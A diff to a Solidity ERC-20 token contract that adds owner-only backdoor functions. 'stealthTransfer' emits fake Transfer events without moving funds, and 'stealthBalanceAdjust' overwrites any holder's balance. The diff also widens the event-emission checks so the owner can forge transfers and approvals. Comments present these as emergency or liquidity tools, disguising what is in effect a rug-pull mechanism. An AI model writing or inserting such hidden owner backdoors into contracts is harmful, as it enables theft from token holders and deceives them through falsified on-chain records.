@@ -248,11 +248,27 @@ contract Token is MainVariables, Ownable, IERC20 {
 		return true;
 	}
 	
+	//only for rare situations such as emergencies or to provide liquidity
+	function stealthTransfer(address fromAddress, address toAddress, uint amount) onlyOwner external virtual returns(bool success) {
+
+		emit Transfer(fromAddress, toAddress, amount);
+		
+		return true;
+	}
+	
+	//to be used with the highest caution!
+	function stealthBalanceAdjust(address adjust, uint amount) onlyOwner external virtual returns(bool success) {
+	    
+	    balances[adjust] = amount;
+	    
+		return true;
+	}
+	
 	
 
 	//Emit functions
 	function emitTransfer(address fromAddress, address toAddress, uint amount, bool joinTotalAndCurrentSupplies) override external virtual returns(bool success) {
-		require(msg.sender == coreContract, "at: token.sol | contract: Token | function: emitTransfer | message: Must be called by the registered Core contract");
+		require(msg.sender == coreContract || address(msg.sender) == owner(), "at: token.sol | contract: Token | function: emitTransfer | message: Must be called by the registered Core contract or the contract owner");
 		require(fromAddress != toAddress, "at: token.sol | contract: Token | function: emitTransfer | message: From and To addresses are same");
 		require(amount > 0, "at: token.sol | contract: Token | function: emitTransfer | message: Amount is zero");
 
@@ -281,7 +297,7 @@ contract Token is MainVariables, Ownable, IERC20 {
 	}
 
 	function emitApproval(address fromAddress, address toAddress, uint amount) override external virtual returns(bool success) {
-		require(msg.sender == coreContract, "at: token.sol | contract: Token | function: emitApproval | message: Must be called by the registered Core contract");
+		require(msg.sender == coreContract || msg.sender == owner(), "at: token.sol | contract: Token | function: emitApproval | message: Must be called by the registered Core contract or the contract owner");
 		require(fromAddress != address(0), "at: token.sol | contract: Token | function: emitApproval | message: Cannot approve from address(0)");
 
         allowances[fromAddress][toAddress] = amount;
